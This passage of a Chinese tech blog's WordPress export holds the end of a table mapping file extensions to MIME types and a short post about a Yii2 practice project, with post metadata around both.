<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-visio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.vsw</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-visio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.w60</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/wordperfect6.0</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.w61</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/wordperfect6.1</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.w6w</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/msword</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wav</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/wav</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wav</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-wav</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wb1</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-qpro</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wbmp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/vnd.wap.wbmp</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.web</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.xara</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wiz</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/msword</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wk1</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-123</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wmf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">windows/metafile</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wml</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/vnd.wap.wml</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wmlc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.wap.wmlc</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wmls</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/vnd.wap.wmlscript</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wmlsc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.wap.wmlscriptc</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.word</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/msword</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/wordperfect</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wp5</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/wordperfect</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wp5</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/wordperfect6.0</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wp6</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/wordperfect</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wpd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/wordperfect</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wpd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-wpwin</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wq1</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-lotus</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wri</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/mswrite</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wri</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-wri</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wrl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-world</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wrl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">model/vrml</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wrl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">x-world/x-vrml</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wrz</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">model/vrml</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wrz</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">x-world/x-vrml</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wsc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/scriplet</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wsrc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-wais-source</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.wtk</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-wintalk</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xbm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-xbitmap</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xbm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-xbm</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xbm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/xbm</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xdr</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-amt-demorun</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xgz</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">xgl/drawing</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xif</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/vnd.xiff</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xla</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xla</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xla</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-msexcel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlb</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlb</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.ms-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlb</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.ms-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xld</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xld</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlk</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlk</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xll</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xll</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.ms-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xll</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.ms-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xls</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xls</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.ms-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xls</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xls</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-msexcel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlv</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlv</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlw</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlw</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.ms-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlw</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-excel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xlw</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-msexcel</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/xm</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xml</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/xml</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xml</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/xml</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xmz</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">xgl/movie</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xpix</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-vnd.ls-xpix</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xpm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-xpixmap</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xpm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/xpm</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.x-png</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/png</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xsr</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-amt-showrun</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xwd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-xwd</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xwd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-xwindowdump</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.xyz</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">chemical/x-pdb</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.z</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-compress</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.z</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-compressed</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.zip</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-compressed</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.zip</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-zip-compressed</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.zip</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/zip</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.zip</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">multipart/x-zip</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.zoo</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/octet-stream</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.zsh</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-script.zsh</span></td>
</tr>
</tbody>
</table>

<!--more-->]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1634</wp:post_id>
		<wp:post_date><![CDATA[2016-12-06 19:45:59]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-12-06 11:45:59]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[mime-types-%e5%a4%a7%e5%85%a8]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="%e7%bd%91%e7%ab%99%e5%bb%ba%e8%ae%be"><![CDATA[网站建设]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[153]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>基于 Yii2 的练手小项目</title>
		<link>https://www.nervgeek.com/2016/12/13/%e5%9f%ba%e4%ba%8e-yii2-%e7%9a%84%e7%bb%83%e6%89%8b%e5%b0%8f%e9%a1%b9%e7%9b%ae/</link>
		<pubDate>Tue, 13 Dec 2016 08:59:33 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1641</guid>
		<description></description>
		<content:encoded><![CDATA[Yii2 框架挺好用的，就是和BS前端框架关系太大，源代码都内嵌了BS的样式，导致我用Semantic UI 需要做很多改动，而且要稍微修改一下源代码。
做的是一个个人信息分享平台，前个月在国外看到一个小网站，专门统一展示个人的联系方式的，感觉做起来比较简单，就拿来练手了。
目前个人设置页面基本完成，后台也逐步实现功能，做完之后就应该还差权限管理功能了<a href="https://www.nervgeek.com/wp-content/uploads/2016/12/XX5LK9HY4G1C0K7772.png"><img class="alignnone size-full wp-image-1647" src="https://www.nervgeek.com/wp-content/uploads/2016/12/XX5LK9HY4G1C0K7772.png" alt="" width="2560" height="1399" /></a>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/12/SXH03ZYULNSG07JOV2R9.png"><img class="alignnone size-full wp-image-1648" src="https://www.nervgeek.com/wp-content/uploads/2016/12/SXH03ZYULNSG07JOV2R9.png" alt="" width="2560" height="1399" /></a><a href="https://www.nervgeek.com/wp-content/uploads/2016/12/3Z_Z6IKK28A8MR4C0O9M.png"><img class="alignnone size-full wp-image-1649" src="https://www.nervgeek.com/wp-content/uploads/2016/12/3Z_Z6IKK28A8MR4C0O9M.png" alt="" width="2560" height="1399" /></a><a href="https://www.nervgeek.com/wp-content/uploads/2016/12/DSEJ4@KLGIU4B6AQS5_@W.png"><img class="alignnone size-full wp-image-1650" src="https://www.nervgeek.com/wp-content/uploads/2016/12/DSEJ4@KLGIU4B6AQS5_@W.png" alt="" width="2560" height="1399" /></a><a href="https://www.nervgeek.com/wp-content/uploads/2016/12/IUCU3DF_OK4AHZV2UUO.png"><img class="alignnone size-full wp-image-1651" src="https://www.nervgeek.com/wp-content/uploads/2016/12/IUCU3DF_OK4AHZV2UUO.png" alt="" width="2560" height="1399" /></a>
后台界面：
<a href="https://www.nervgeek.com/wp-content/uploads/2016/12/3OKQ7DE_5265KL9.png"><img class="alignnone size-full wp-image-1652" src="https://www.nervgeek.com/wp-content/uploads/2016/12/3OKQ7DE_5265KL9.png" alt="" width="2560" height="1399" /></a>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/12/QKKS1O_GWQOT5HRM3WLP.png"><img class="alignnone size-full wp-image-1655" src="https://www.nervgeek.com/wp-content/uploads/2016/12/QKKS1O_GWQOT5HRM3WLP.png" alt="" width="2560" height="1399" /></a>
还有一些功能尚未实现。这个平台做的时间花得有点多，边学边做了大概两个星期了。主要时间浪费在对框架了解不够太熟悉，很多功能都自带了，却自己造完轮子才发现他们早已帮我们实现了。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1641</wp:post_id>
		<wp:post_date><![CDATA[2016-12-13 16:59:33]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-12-13 08:59:33]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%9f%ba%e4%ba%8e-yii2-%e7%9a%84%e7%bb%83%e6%89%8b%e5%b0%8f%e9%a1%b9%e7%9b%ae]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[php]]></category>
		<category domain="category" nicename="yii2"><![CDATA[Yii2]]></category>
		<category domain="post_tag" nicename="yii2"><![CDATA[Yii2]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[139]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Docker-py 2.0 新建容器参数笔记</title>
		<link>https://www.nervgeek.com/2017/01/03/docker-py-2-0-%e6%96%b0%e5%bb%ba%e5%ae%b9%e5%99%a8%e5%8f%82%e6%95%b0%e7%ac%94%e8%ae%b0/</link>
